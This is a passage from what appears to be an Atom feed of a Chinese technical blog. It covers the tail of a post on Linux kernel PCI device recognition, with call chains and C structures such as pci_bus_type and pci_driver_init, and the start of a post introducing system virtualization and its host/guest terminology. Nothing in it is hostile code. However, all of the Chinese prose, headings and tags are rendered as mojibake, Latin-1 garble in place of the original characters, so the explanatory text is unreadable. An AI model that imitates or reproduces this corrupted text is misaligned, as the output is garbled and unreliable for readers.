class="hljs-keyword">struct</span> <span class="hljs-title">attribute_group</span> **<span class="hljs-title">groups</span>;</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">attribute_group</span> **<span class="hljs-title">dev_groups</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">device_driver</span><span class="hljs-title">driver</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pci_dynids</span><span class="hljs-title">dynids</span>;</span><br><span class="hljs-type">bool</span> driver_managed_dma;<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="II-è¯†åˆ«è¿‡ç¨‹"><a href="#II-è¯†åˆ«è¿‡ç¨‹" class="headerlink" title="II.è¯†åˆ«è¿‡ç¨‹"></a>II.è¯†åˆ«è¿‡ç¨‹</h3><p>è®²å®Œäº†åŸºæœ¬ç»“æ„ï¼Œç°åœ¨æˆ‘ä»¬å¯ä»¥æ¥çœ‹å†…æ ¸æ˜¯æ€ä¹ˆå»è¯†åˆ« PCI è®¾å¤‡çš„äº†ï¼Œåœ¨å†…æ ¸å¯åŠ¨åå„æ¶æ„çš„åˆå§‹åŒ–å‡½æ•°æœ€ç»ˆéƒ½ä¼šè°ƒç”¨åˆ° <code>start_kernel()</code>ï¼Œäºæ˜¯å­˜åœ¨å¦‚ä¸‹è°ƒç”¨é“¾ï¼š</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">start_kernel</span>()<br><span class="hljs-built_in">arch_call_rest_init</span>()<br><span class="hljs-built_in">rest_init</span>()<span class="hljs-comment">// å¯åŠ¨ä¸‰ä¸ªè¿›ç¨‹ idleï¼ˆ0ï¼‰ã€kernel_initï¼ˆ1ï¼‰ã€kthreaddï¼ˆ2ï¼‰</span><br><span class="hljs-built_in">kernel_init</span>()<br><span class="hljs-built_in">kernel_init_freeable</span>()<br><span class="hljs-built_in">do_basic_setup</span>()<br><span class="hljs-built_in">driver_init</span>()<br><span class="hljs-built_in">devtmpfs_init</span>()<span class="hljs-comment">// å»ºç«‹ devtmpfsï¼Œä¹‹åä¼šè¢«ç”¨æˆ·æ€initæŒ‚åˆ°/devä¸‹é¢</span><br><span class="hljs-built_in">buses_init</span>()<span class="hljs-comment">// åœ¨ sysfs æ ¹ä¸‹å»ºç«‹ bus ç›®å½•</span><br></code></pre></td></tr></table></figure><p>ä¹‹åå°±æ˜¯åˆ°å„ä¸ªæ¨¡å—çš„ init å‡½æ•°ï¼ŒæŒ‰ç…§ç¼–è¯‘é“¾æ¥é¡ºåºï¼Œæˆ‘ä»¬æ‰€å…³å¿ƒçš„ PCI ç›¸å…³å‡½æ•°çš„æ‰§è¡Œé¡ºåºåº”å½“å¦‚ä¸‹ï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">pcibus_class_init</span><span class="hljs-params">()</span></span><span class="hljs-comment">// æ³¨å†Œ pci_bus classï¼Œåˆ›å»º sysfs ä¸‹çš„ class/pci_bus ç›®å½•</span><br>â†“<br><span class="hljs-function"><span class="hljs-title">pci_driver_init</span><span class="hljs-params">()</span></span><span class="hljs-comment">// æ³¨å†Œ pci_bus_typeï¼Œåˆ›å»º sysfs ä¸‹çš„ bus/pci ç›®å½•</span><br>â†“<br><span class="hljs-function"><span class="hljs-title">acpi_pci_init</span><span class="hljs-params">()</span></span><span class="hljs-comment">// æ³¨å†Œ acpi_pci_busï¼Œå¹¶è®¾ç½®ç”µæºç®¡ç†çš„ç›¸åº”æ“ä½œ</span><br>â†“<br><span class="hljs-function"><span class="hljs-title">acpi_init</span><span class="hljs-params">()</span></span><span class="hljs-comment">// pcie åˆå§‹åŒ–å…¥å£ï¼Œè¿›è¡Œè®¾å¤‡è¯†åˆ«ä¸æ¨¡å‹å»ºç«‹</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬æŒ‘å…¶ä¸­å…³é”®çš„å‡ ä¸ªæ¥çœ‹ï¼Œé¦–å…ˆæ˜¯ <code>acpi_init()</code>ï¼Œå­˜åœ¨å¦‚ä¸‹è°ƒç”¨è·¯å¾„ï¼š</p><blockquote><p>å‰ç½®çŸ¥è¯†ï¼šACPI è§„èŒƒ</p></blockquote><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">acpi_init</span>()<br><span class="hljs-built_in">pci_mmcfg_late_init</span>() <span class="hljs-comment">// æ‰«æ MCFG è¡¨ï¼Œè·å–æ‰€æœ‰è®¾å¤‡PCIé…ç½®ç©ºé—´çš„åŸºåœ°å€</span><br><span class="hljs-built_in">acpi_scan_init</span>()<br><span class="hljs-built_in">acpi_pci_root_init</span>()<br><span class="hljs-built_in">acpi_scan_add_handler_with_hotplug</span>()<span class="hljs-comment">// æ·»åŠ  handlerï¼špci_root_handler</span><br><span class="hljs-built_in">acpi_bus_scan</span>()<span class="hljs-comment">// è®¾å¤‡æ‰«æï¼Œåˆ›å»º ACPI è®¾å¤‡èŠ‚ç‚¹å¯¹è±¡</span><br><span class="hljs-built_in">acpi_bus_attach</span>()<span class="hljs-comment">// å¤„ç†å•ä¸ªèŠ‚ç‚¹å¹¶è°ƒç”¨ acpi_bus_attach() å¤„ç†å­èŠ‚ç‚¹ï¼ˆDFSï¼‰</span><br><span class="hljs-built_in">acpi_scan_attach_handler</span>()<span class="hljs-comment">// æŸ¥æ‰¾åŒ¹é…çš„ handler å¹¶è°ƒç”¨ attach æŒ‡é’ˆ</span><br>handler-&gt;<span class="hljs-built_in">attach</span>(device, devid)<br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆç°åœ¨æˆ‘ä»¬æ¥çœ‹å¯¹åº”çš„ handlerï¼Œä¸ºåœ¨ <code>acpi_scan_add_handler_with_hotplug()</code> ä¸­æ³¨å†Œçš„ <code>pci_root_handler</code> ï¼Œè¯¥å˜é‡å®šä¹‰äº <code>/drivers/acpi/pci_host.c</code> ä¸­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">acpi_scan_handler</span> <span class="hljs-title">pci_root_handler</span> =</span> &#123;<br>.ids = root_device_ids,<br>.attach = acpi_pci_root_add,<br>.detach = acpi_pci_root_remove,<br>.hotplug = &#123;<br>.enabled = <span class="hljs-literal">true</span>,<br>.scan_dependent = acpi_pci_root_scan_dependent,<br>&#125;,<br>&#125;;<br></code></pre></td></tr></table></figure><p>äºæ˜¯æœ€åè°ƒç”¨åˆ° <code>acpi_pci_root_add()</code>ï¼Œä¸ºè®¾å¤‡èŠ‚ç‚¹åˆ›å»ºå¯¹åº”çš„å†…æ ¸ç»“æ„ä½“</p><blockquote><p>è¿™ä¸ªå‡½æ•°ä¸­é—´å…¶å®è¿˜æœ‰ä¸€äº›è¿‡ç¨‹ï¼Œ<del>ä½†æ˜¯ğŸ‘´æ‘¸äº†</del></p></blockquote><p>æ¥ä¸‹æ¥æˆ‘ä»¬æ¥çœ‹ <code>pci_driver_init()</code>ï¼Œè¯¥å‡½æ•°åœ¨å†…æ ¸é©±åŠ¨æ¨¡å‹ä¸­æ³¨å†Œäº† PCI æ€»çº¿ï¼Œå¹¶å®šä¹‰äº†ç›¸å…³çš„æ“ä½œå‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> __init <span class="hljs-title function_">pci_driver_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-type">int</span> ret;<br><br>ret = bus_register(&amp;pci_bus_type);<br><span class="hljs-keyword">if</span> (ret)<br><span class="hljs-keyword">return</span> ret;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_PCIEPORTBUS</span><br>ret = bus_register(&amp;pcie_port_bus_type);<br><span class="hljs-keyword">if</span> (ret)<br><span class="hljs-keyword">return</span> ret;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>dma_debug_add_bus(&amp;pci_bus_type);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>postcore_initcall(pci_driver_init);<br></code></pre></td></tr></table></figure><p>è¯¥å‡½æ•°ä¸­è°ƒç”¨äº† <code>bus_register()</code> æ¥æ³¨å†Œ PCI æ€»çº¿ï¼Œå¯¹åº”åˆ°ç¬¦åˆå†…æ ¸è®¾å¤‡é©±åŠ¨æ¨¡å‹çš„æ€»çº¿ç±»å‹çš„å˜é‡ä¸º <code>pci_bus_type</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bus_type</span> <span class="hljs-title">pci_bus_type</span> =</span> &#123;<br>.name= <span class="hljs-string">&quot;pci&quot;</span>,<br>.match= pci_bus_match,<br>.uevent= pci_uevent,<br>.probe= pci_device_probe,<br>.remove= pci_device_remove,<br>.shutdown= pci_device_shutdown,<br>.dev_groups= pci_dev_groups,<br>.bus_groups= pci_bus_groups,<br>.drv_groups= pci_drv_groups,<br>.pm= PCI_PM_OPS_PTR,<br>.num_vf= pci_bus_num_vf,<br>.dma_configure= pci_dma_configure,<br>.dma_cleanup= pci_dma_cleanup,<br>&#125;;<br>EXPORT_SYMBOL(pci_bus_type);<br></code></pre></td></tr></table></figure><h2 id="äºŒã€è®¾å¤‡é©±åŠ¨æ¡†æ¶"><a href="#äºŒã€è®¾å¤‡é©±åŠ¨æ¡†æ¶" class="headerlink" title="äºŒã€è®¾å¤‡é©±åŠ¨æ¡†æ¶"></a>äºŒã€è®¾å¤‡é©±åŠ¨æ¡†æ¶</h2><h2 id="ä¸‰ã€PCI-probe-è®¾å¤‡è¯†åˆ«"><a href="#ä¸‰ã€PCI-probe-è®¾å¤‡è¯†åˆ«" class="headerlink" title="ä¸‰ã€PCI probe - è®¾å¤‡è¯†åˆ«"></a>ä¸‰ã€PCI probe - è®¾å¤‡è¯†åˆ«</h2><h2 id="å››ã€PCI-remove-è®¾å¤‡ç§»é™¤"><a href="#å››ã€PCI-remove-è®¾å¤‡ç§»é™¤" class="headerlink" title="å››ã€PCI remove - è®¾å¤‡ç§»é™¤"></a>å››ã€PCI remove - è®¾å¤‡ç§»é™¤</h2>]]></content>
    
    
    <summary type="html">&lt;p&gt;ğŸ‘´ç­‰ä¼šæŠŠä½ æ€»çº¿éƒ½ç»™æ‰¬äº†&lt;/p&gt;</summary>
    
    
    
    <category term="HARDWARE" scheme="http://blog.arttnba3.cn/categories/HARDWARE/"/>
    
    
    <category term="å­¦ä¹ æœ­è®°" scheme="http://blog.arttnba3.cn/tags/%E5%AD%A6%E4%B9%A0%E6%9C%AD%E8%AE%B0/"/>
    
    <category term="PCI" scheme="http://blog.arttnba3.cn/tags/PCI/"/>
    
    <category term="è®¡ç®—æœºç»„æˆåŸç†" scheme="http://blog.arttnba3.cn/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/"/>
    
    <category term="Linux Driver" scheme="http://blog.arttnba3.cn/tags/Linux-Driver/"/>
    
  </entry>
  
  <entry>
    <title>ã€VIRT.0x02ã€‘ç³»ç»Ÿè™šæ‹ŸåŒ–å¯¼è®º</title>
    <link href="http://blog.arttnba3.cn/2022/08/29/VURTUALIZATION-0X02-BASIC_KNOWLEDGE/"/>
    <id>http://blog.arttnba3.cn/2022/08/29/VURTUALIZATION-0X02-BASIC_KNOWLEDGE/</id>
    <published>2022-08-28T20:39:22.000Z</published>
    <updated>2022-09-04T16:44:45.982Z</updated>
    
    <content type="html"><![CDATA[<p>è™šæ‹ŸåŒ–æ–¹å‘YLGé€Ÿæˆå…¥é—¨æŒ‡åŒ—</p><span id="more"></span><h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p>å› ä¸ºç¬”è€…æœ€è¿‘ä¸çŸ¥é“ä¸ºä»€ä¹ˆå¼€å§‹åš X86 è™šæ‹ŸåŒ–è¿™ä¸€å—çš„å·¥ä½œäº†ï¼ˆå¤§é›¾ï¼‰ï¼Œè€Œè™šæ‹ŸåŒ–çš„çŸ¥è¯†ç‚¹æ¯”è¾ƒæ‚ä¹Ÿæ¯”è¾ƒä¹±ï¼Œæ‰€ä»¥ç‰¹åœ°å¼€è¿™ä¸€ç¯‡åšå®¢ç®€å•è®°å½•ä¸€ä¸‹è™šæ‹ŸåŒ–çš„ä¸€äº›åŸºæœ¬æ¦‚å¿µ</p><h1 id="0x01-Virtualization-Basis"><a href="#0x01-Virtualization-Basis" class="headerlink" title="0x01. Virtualization Basis"></a>0x01. Virtualization Basis</h1><h2 id="ä¸€ã€è™šæ‹ŸåŒ–çš„åŸºæœ¬æ¦‚å¿µ"><a href="#ä¸€ã€è™šæ‹ŸåŒ–çš„åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="ä¸€ã€è™šæ‹ŸåŒ–çš„åŸºæœ¬æ¦‚å¿µ"></a>ä¸€ã€è™šæ‹ŸåŒ–çš„åŸºæœ¬æ¦‚å¿µ</h2><p>ä»€ä¹ˆæ˜¯è™šæ‹ŸåŒ–ï¼Ÿç‹­ä¹‰åœ°è¯´ï¼Œå¤§å®¶åœ¨æ—¥å¸¸ç”Ÿæ´»ä¸­è¯´åˆ°çš„è™šæ‹ŸåŒ–ä¸»è¦æŒ‡çš„è¿˜æ˜¯ <em>è™šæ‹Ÿæœº</em> ï¼ˆVirtual Machineï¼‰ï¼Œå³<strong>é€šè¿‡è™šæ‹ŸåŒ–æŠ€æœ¯å°†ä¸€å°è®¡ç®—æœºè™šæ‹Ÿä¸ºå¤šå°é€»è¾‘è®¡ç®—æœº</strong>â€”â€”è¿™å…¶å®æ˜¯è™šæ‹ŸåŒ–æŠ€æœ¯ä¸­çš„ä¸€ä¸ªæŠ½è±¡ç²’åº¦ä¸ºå•ä¸ªè®¡ç®—æœºçš„åˆ†æ”¯ï¼š<code>ç³»ç»Ÿè™šæ‹ŸåŒ–</code></p><p>åœ¨è®¡ç®—æœºç§‘å­¦å½“ä¸­ï¼Œ<strong>è™šæ‹ŸåŒ–</strong>ï¼ˆVirtualizationï¼‰æŒ‡çš„å…¶å®æ˜¯ä¸€ç§ã€Œ<strong>å°†è®¡ç®—æœºçš„å„ç§å®ä½“èµ„æºè¿›è¡Œé€»è¾‘æŠ½è±¡ï¼Œä»è€Œå‘ˆç°å‡ºä¸åŒçš„è™šæ‹Ÿèµ„æº</strong>ã€çš„èµ„æºç®¡ç†æŠ€æœ¯ã€‚åˆ©ç”¨è™šæ‹ŸåŒ–æŠ€æœ¯ï¼Œæˆ‘ä»¬å¯ä»¥æ‰“ç ´å®ä½“ç»“æ„é—´ä¸å¯åˆ‡å‰²çš„ç‰¹æ€§â€”â€”ä¸€ä»½å®ä½“èµ„æºå¯ä»¥å¯¹ç”¨æˆ·å‘ˆç°ä¸ºå¤šä»½è™šæ‹Ÿèµ„æºï¼Œå¤šä»½å®ä½“èµ„æºä¹Ÿå¯ä»¥å‘ˆç°ä¸ºä¸€ä»½ç‰©ç†èµ„æºã€‚</p><p>é€šè¿‡è™šæ‹ŸåŒ–æŠ€æœ¯ï¼Œæˆ‘ä»¬å¯ä»¥å®ç°èµ„æºçš„åŠ¨æ€åˆ†é…ã€çµæ´»è°ƒåº¦ã€è·¨åŸŸå…±äº«ç­‰ï¼Œä»è€Œæé«˜èµ„æºçš„åˆ©ç”¨ç‡ã€‚</p><p><img src="https://s2.loli.net/2022/08/09/Tj6qGVH82suwhMy.png" alt="image.png"></p><blockquote><p>è¿™é‡Œæ‰€è¯´çš„å®ä½“èµ„æºåŒ…æ‹¬<strong>CPUã€å†…å­˜ã€ç£ç›˜ç©ºé—´ã€ç½‘ç»œé€‚é…å™¨</strong>ç­‰ã€‚</p></blockquote><p>è¿™é‡Œç¬”è€…æ‘˜æŠ„ä¸€æ®µæ¥è‡ªä¸€æœ¬ç»å…¸çš„è™šæ‹ŸåŒ–æŠ€æœ¯æ•™æçš„å™è¿°ï¼š</p><blockquote><p>æŠ½è±¡æ¥è¯´ï¼Œè™šæ‹ŸåŒ–æ˜¯èµ„æºçš„é€»è¾‘è¡¨ç¤ºï¼Œå®ƒä¸å—ç‰©ç†é™åˆ¶çš„çº¦æŸã€‚å…·ä½“æ¥è¯´ï¼Œè™šæ‹ŸåŒ–æŠ€æœ¯çš„å®ç°å½¢å¼æ˜¯åœ¨ç³»ç»Ÿä¸­åŠ å…¥ä¸€ä¸ªè™šæ‹Ÿå±‚ï¼Œè™šæ‹ŸåŒ–å±‚å°†ä¸‹å±‚çš„èµ„æºæŠ½è±¡æˆå¦ä¸€å½¢å¼çš„èµ„æºï¼Œæä¾›ç»™ä¸Šå±‚ä½¿ç”¨ã€‚é€šè¿‡ç©ºé—´ä¸Šçš„åˆ†å‰²ã€æ—¶é—´ä¸Šçš„åˆ†æ—¶ä»¥åŠæ¨¡æ‹Ÿï¼Œè™šæ‹ŸåŒ–å¯ä»¥å°†ä¸€ä»½èµ„æºæŠ½è±¡æˆå¤šåˆ†ã€‚åè¿‡æ¥ï¼Œè™šæ‹ŸåŒ–ä¹Ÿå¯ä»¥å°†å¤šä»½èµ„æºæŠ½è±¡æˆä¸€ä»½ã€‚</p><p>â€”â€”ã€Šç³»ç»Ÿè™šæ‹ŸåŒ–ï¼šåŸç†ä¸å®ç°ã€‹</p></blockquote><p>å³è™šæ‹ŸåŒ–æŠ€æœ¯çš„å®ç°å…¶å®æºè‡ªäºç°ä»£è®¡ç®—æœºç³»ç»Ÿè‡ªä¸‹è€Œä¸Šçš„å¤šå±‚æŠ½è±¡çš„ç»“æ„ï¼šã€Œ<strong>æ¯ä¸ªå±‚æ¬¡éƒ½å‘ä¸Šä¸€å±‚æ¬¡å‘ˆç°ä¸€ä¸ªæŠ½è±¡ï¼Œæ¯ä¸€å±‚åªéœ€è¦çŸ¥é“ä¸‹å±‚çš„æŠ½è±¡æ¥å£ï¼Œè€Œæ— éœ€äº†è§£å…¶å†…éƒ¨è¿ä½œæœºåˆ¶</strong>ã€â€”â€”æˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯ï¼Œ<strong>åªè¦æˆ‘ä»¬èƒ½å¤Ÿé€šè¿‡æŸç§æ–¹å¼å‘ä¸Šå±‚æä¾›è¡¨ç°ç›¸åŒçš„æŠ½è±¡æ¥å£ï¼Œåœ¨ä¸Šå±‚çœ‹æ¥æˆ‘ä»¬å°±æ˜¯æ­£å¸¸çš„è¯¥å±‚æ‰€æä¾›çš„èµ„æºï¼Œä»è€Œå°±å®ç°äº†å¯¹è¯¥å±‚çš„è™šæ‹ŸåŒ–ã€‚</strong></p><p><img src="https://s2.loli.net/2022/08/02/lDLgE6tyNe87M12.png" alt="image.png"></p><p>ç”±æ­¤ï¼Œä»ç‰©ç†å±‚ä¸è™šæ‹Ÿå±‚çš„ä¸¤ä¾§æ¥çœ‹ï¼Œæˆ‘ä»¬ä¾¿æœ‰äº†è™šæ‹ŸåŒ–ä¸­çš„ä¸¤ä¸ªé‡è¦å®šè¯­ï¼š</p><ul><li>ã€Œ<strong>Host</strong>ã€ï¼šç‰©ç†èµ„æºæ–¹</li><li>ã€Œ<strong>Guest</strong>ã€ï¼šè™šæ‹Ÿèµ„æºæ–¹</li></ul><p>æ ¹æ®èµ„æºçš„ä¸åŒï¼Œåœ¨è¿™ä¸¤ä¸ªå®šè¯­ä¹‹åæˆ‘ä»¬å¯ä»¥æ¥ä¸åŒçš„åè¯ï¼šä¾‹å¦‚æˆ‘ä»¬å°†ä¸€å°ç‰©ç†æœºå™¨ç§°ä¹‹ä¸º <code>Host Machine</code> ï¼ˆå®¿ä¸»æœºï¼‰ï¼Œå°†è¿è¡Œåœ¨å…¶ä¸Šçš„è™šæ‹Ÿæœºç§°ä¹‹ä¸º <code>Guest Machine</code> ï¼ˆå®¢æˆ·æœºï¼‰ï¼›ç›¸åº”åœ°ï¼Œåœ¨å®¿ä¸»æœºä¸Šè‹¥è¿è¡Œæœ‰æ“ä½œç³»ç»Ÿï¼Œåˆ™ç§°ä¹‹ä¸º <code>Host OS</code>ï¼Œè€Œè¿è¡Œåœ¨è™šæ‹Ÿæœºä¸­çš„æ“ä½œç³»ç»Ÿç§°ä¹‹ä¸º <code>Guest OS</code></p><p>ç”±æ­¤ï¼Œæˆ‘ä»¬å°†ä½äºä¸åŒæŠ½è±¡å±‚ä¸Šçš„è™šæ‹ŸåŒ–åˆ†ä¸ºå¦‚ä¸‹ç±»ï¼š</p><ul><li><strong>ç¡¬ä»¶æŠ½è±¡å±‚ä¸Šçš„è™šæ‹ŸåŒ–</strong>ï¼šé€šè¿‡è™šæ‹Ÿç¡¬ä»¶æŠ½è±¡å±‚æ¥å®ç°è™šæ‹Ÿæœºå™¨ï¼Œä¸º Guest OS å‘ˆç°ä¸ç‰©ç†ç¡¬ä»¶ç›¸åŒæˆ–ç›¸ç±»ä¼¼çš„ç¡¬ä»¶æŠ½è±¡å±‚ï¼Œä¹Ÿç§°ä¹‹ä¸ºã€Œ<strong>ç³»ç»Ÿçº§è™šæ‹ŸåŒ–</strong>ã€ï¼ˆä¾‹å¦‚VMWareã€Xenï¼‰</li><li>æ“ä½œç³»ç»Ÿå±‚ä¸Šçš„è™šæ‹ŸåŒ–ï¼šé€šå¸¸æŒ‡çš„æ˜¯æ“ä½œç³»ç»Ÿå†…æ ¸å¯ä»¥æä¾›å¤šä¸ªäº’ç›¸éš”ç¦»çš„ç”¨æˆ·æ€å®ä¾‹ï¼ˆé€šå¸¸ç§°ä¹‹ä¸ºå®¹å™¨ï¼‰ï¼Œè¿™äº›ç”¨æˆ·æ€å®ä¾‹å¯¹å…¶ç”¨æˆ·è€Œè¨€å°±åƒæ˜¯ä¸€å°çœŸå®çš„è®¡ç®—æœºï¼Œæœ‰ç€è‡ªå·±ç‹¬ç«‹çš„ç½‘ç»œã€æ–‡ä»¶ç³»ç»Ÿç­‰ï¼ˆä¾‹å¦‚ VServerï¼‰</li><li>åº“å‡½æ•°å±‚ä¸Šçš„è™šæ‹ŸåŒ–ï¼šé€šè¿‡è™šæ‹ŸåŒ–æ“ä½œç³»ç»Ÿçš„åº”ç”¨çº§åº“å‡½æ•°çš„æœåŠ¡æ¥å£ï¼Œä½¿å¾—åº”ç”¨ç¨‹åºä¸éœ€è¦ä¿®æ”¹å°±å¯ä»¥åœ¨ä¸åŒçš„æ“ä½œç³»ç»Ÿä¸­æ— ç¼è¿è¡Œï¼ˆä¾‹å¦‚ Wineã€WSLï¼‰</li><li>ç¼–ç¨‹è¯­è¨€å±‚ä¸Šçš„è™šæ‹ŸåŒ–ï¼šè¿™ç±»è™šæ‹Ÿæœºè¿è¡Œçš„æ˜¯è¿›ç¨‹çº§åˆ«çš„ä¸å­˜åœ¨äºç¡¬ä»¶ä¸Šçš„è™šæ‹Ÿä½“ç³»ç»“æ„ï¼Œå…¶ç¨‹åºä»£ç ç”±è™šæ‹Ÿæœºçš„è¿è¡Œæ—¶æ”¯æŒç³»ç»Ÿ<strong>ç¿»è¯‘</strong>æˆæœºå™¨è¯­è¨€åå†æ‰§è¡Œï¼Œå±äºè¿›ç¨‹çº§çš„è™šæ‹ŸåŒ–ï¼ˆä¾‹å¦‚ JVMï¼‰</li></ul><blockquote><p>ä¾‹å¦‚ Linux kernel å½“ä¸­çš„ VFS ä¾¿æ˜¯éå¸¸ç¬¦åˆè™šæ‹ŸåŒ–è¿™ä¸€æ¦‚å¿µçš„å­ç³»ç»Ÿï¼šä»ä¸Šå±‚è°ƒç”¨çš„è§’åº¦è€Œè¨€ï¼Œæˆ‘ä»¬æ‰€çœ‹åˆ°çš„éƒ½æ˜¯ç»Ÿä¸€çš„ API æ¥å£ï¼Œä¸åŒæ–‡ä»¶ç³»ç»Ÿçš„å…·ä½“å®ç°åˆ™è¢«éšè—åœ¨äº† VFS å±‚çš„ä¸‹æ–¹ã€‚æˆ‘ä»¬åªéœ€è¦çŸ¥é“åœ¨è¿™ä¸€æŠ½è±¡å±‚ä¸­ openã€readã€write ç­‰æŠ½è±¡ API çš„ç”¨æ³•ï¼Œè€Œæ— éœ€å…³æ³¨åº•å±‚çš„ ext4 æˆ–æ˜¯ ntfs çš„å†…éƒ¨å®ç°ã€‚</p><p>è™šæ‹ŸåŒ–äº¦æ˜¯å¦‚æ­¤ï¼Œä» Guest ä¾§æˆ‘ä»¬æ‰€èƒ½çœ‹åˆ°çš„ä¹Ÿåªæ˜¯ç»Ÿä¸€çš„è™šæ‹Ÿèµ„æºçš„æ¥å£ï¼Œæˆ–è€…è¯´ Host ä¸ºæˆ‘ä»¬å‘ˆç°å‡ºäº†è™šæ‹ŸåŒ–çš„èµ„æºæ¥å£ï¼Œå…¶è¡¨ç°çš„è¡Œä¸ºä¸å®ä½“è®¾å¤‡æ˜¯ä¸€è‡´çš„ã€‚</p></blockquote><p>æˆ‘ä»¬æ—¥å¸¸æ‰€è¯´çš„è™šæ‹ŸåŒ–æŠ€æœ¯ä¸»è¦æ˜¯<strong>ç¡¬ä»¶æŠ½è±¡å±‚ä¸Šçš„è™šæ‹ŸåŒ–</strong>ï¼Œå³ã€Œ<strong>ç³»ç»Ÿçº§è™šæ‹ŸåŒ–</strong>ã€ï¼šé€šè¿‡è™šæ‹ŸåŒ–æŠ€æœ¯å°†ä¸€å°è®¡ç®—æœºè™šæ‹Ÿä¸ºå¤šå°é€»è¾‘è®¡ç®—æœº</p><p>é’ˆå¯¹å®ä½“èµ„æºç±»å‹çš„ä¸åŒï¼Œæˆ‘ä»¬è¿˜å¯ä»¥å†ç»†åˆ†ä¸ºï¼š</p><ul><li><strong>è®¡ç®—è™šæ‹ŸåŒ–</strong>ï¼šé’ˆå¯¹ CPU å’Œå†…å­˜èµ„æºè¿›è¡Œè™šæ‹ŸåŒ–</li><li><strong>ç½‘ç»œè™šæ‹ŸåŒ–</strong>ï¼šé’ˆå¯¹ç½‘ç»œé“¾è·¯èµ„æºè¿›è¡Œè™šæ‹ŸåŒ–</li><li><strong>IOè™šæ‹ŸåŒ–</strong>ï¼šé’ˆå¯¹ IO èµ„æºè¿›è¡Œè™šæ‹ŸåŒ–</li><li><strong>å­˜å‚¨è™šæ‹ŸåŒ–</strong>ï¼šé’ˆå¯¹ç£ç›˜å­˜å‚¨èµ„æºè™šæ‹ŸåŒ–</li></ul><h2 id="äºŒã€è™šæ‹ŸåŒ–ä¸äº‘è®¡ç®—"><a href="#äºŒã€è™šæ‹ŸåŒ–ä¸äº‘è®¡ç®—" class="headerlink" title="äºŒã€è™šæ‹ŸåŒ–ä¸äº‘è®¡ç®—"></a>äºŒã€è™šæ‹ŸåŒ–ä¸äº‘è®¡ç®—</h2><p>è¯´åˆ°è™šæ‹ŸåŒ–å°±ä¸å¾—ä¸æäº‘è®¡ç®—è¿™ä¸€â€œæ–°å…´äº‹ç‰©â€ï¼ˆå…¶å®åœ¨ç¬”è€…å†™ä¸‹è¿™å¥è¯çš„æ—¶å€™äº‘è®¡ç®—æŠ€æœ¯å·²ç»å‘å±•å¤šå¹´äº†hhhï¼‰ï¼Œä¼¼ä¹æ¯æ¬¡æåˆ°äº‘è®¡ç®—æ€»æ˜¯ç¦»ä¸å¼€è™šæ‹ŸåŒ–è¿™ä¸ªè¯ï¼Œé‚£å…ˆæ¥å’Œç¬”è€…ä¸€èµ·çœ‹ä¸€ä¸‹ã€Œä»€ä¹ˆæ˜¯äº‘è®¡ç®—å§ã€ï¼ˆç¬‘ï¼‰</p><ul><li>ã€Œ<strong>äº‘è®¡ç®—</strong>ã€ï¼ˆCloud 